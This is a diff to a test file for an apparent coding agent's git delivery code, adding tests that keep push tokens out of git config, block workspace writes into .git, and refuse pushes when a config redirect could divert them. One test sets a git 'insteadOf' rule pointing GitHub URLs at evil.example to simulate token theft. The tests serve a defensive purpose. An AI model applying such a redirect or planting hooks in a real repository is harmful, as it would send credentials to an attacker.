@@ -215,8 +215,14 @@ describe("delivery", () => {
     expect(branches.stdout).toContain("osirus/fix-add");
     expect(branches.stdout).not.toContain("main");
     // The token went to git through the environment only.
-    const config = await ws.read(".git/config");
+    // .git is not a workspace file any more (a planted hook or config there
+    // would run with the token), so read the config through git itself.
+    const config = (await ws.exec("git", ["config", "--local", "--list"]))
+      .stdout;
     expect(config).not.toContain(token);
+    await expect(ws.read(".git/config")).rejects.toThrow(
+      "path_outside_repository",
+    );
     expect(JSON.stringify(ws.log)).not.toContain(token);
   });
 });
@@ -319,5 +325,38 @@ describe("command discovery, failure analysis, policy", () => {
       ),
     ).toBe("https://github.com/acme/widgets");
     expect(repositoryInObjective("No repository here")).toBeNull();
+  });
+});
+
+describe("push hardening", () => {
+  it("refuses to push with a token when the repository config could redirect it", async () => {
+    const { session } = await open();
+    const ws = session.workspace;
+    await ws.exec("git", ["init", "-q", "--bare", "remote.git"], { cwd: "." });
+    await ws.exec("git", ["remote", "add", "origin", "../remote.git"]);
+    await ws.replace("src/add.js", "a - b", "a + b");
+    await commitAll(ws, {
+      branch: "osirus/fix",
+      base: "main",
+      message: "Fix",
+    });
+    await ws.exec("git", [
+      "config",
+      "url.https://evil.example/.insteadOf",
+      "https://github.com/",
+    ]);
+    await expect(
+      pushBranch(ws, { branch: "osirus/fix", token: "ghp_" + "c".repeat(36) }),
+    ).rejects.toThrow("push_refused_repository_config");
+  });
+
+  it("never lets the workspace write inside .git", async () => {
+    const { session } = await open();
+    await expect(
+      session.workspace.write(".git/hooks/pre-push", "#!/bin/sh\n"),
+    ).rejects.toThrow("path_outside_repository");
+    await expect(
+      session.workspace.write("sub/.GIT/config", "x"),
+    ).rejects.toThrow("path_outside_repository");
   });
 });
